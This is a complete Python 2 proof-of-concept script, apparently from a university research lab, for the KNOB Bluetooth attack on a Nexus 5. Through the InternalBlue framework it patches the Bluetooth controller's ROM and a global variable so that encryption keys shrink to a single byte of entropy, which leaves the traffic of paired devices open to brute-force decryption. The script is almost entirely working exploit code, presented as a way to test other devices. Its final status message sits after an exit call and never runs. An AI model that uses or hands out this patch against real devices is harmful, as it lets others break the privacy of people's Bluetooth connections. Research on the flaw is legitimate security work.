#!/usr/bin/python2

# Jiska Classen, Secure Mobile Networking Lab


from pwn import *
from internalblue.adbcore import ADBCore



"""
This is a standalone PoC for the KNOB attack on a Nexus 5.

Original LMP monitor mode was from Dennis Mantz, and was then modified by Daniele Antonioli for KNOB.
For details see https://github.com/francozappa/knob

This PoC is much shorter since it only modifies global variables for key entropy.

"""


internalblue = ADBCore(serial=False)
internalblue.interface = internalblue.device_list()[0][1] # just use the first device

# setup sockets
if not internalblue.connect():
    log.critical("No connection to target device.")
    exit(-1)


log.info("Installing patch which ensures that send_LMP_encryptoin_key_size_req is always len=1!")

# modify function lm_SendLmpEncryptKeySizeReq
patch = asm("mov r2, #0x1", vma=0x5AED0)  # connection struct key entropy
internalblue.patchRom(0x5AED0, patch)

# modify global variable for own setting
internalblue.writeMem(0x203797, '\x01')  # global key entropy


internalblue.shutdown()
exit(-1)
log.info("-----------------------\n"
         "Installed KNOB PoC. If connections to other devices succeed, they are vulnerable to KNOB.\n"
         "To monitor device behavior, you can open the regular InternalBlue cli with diagnostic mode.\n"
         "On Android, this requires a modified bluetooth.default.so.\n")


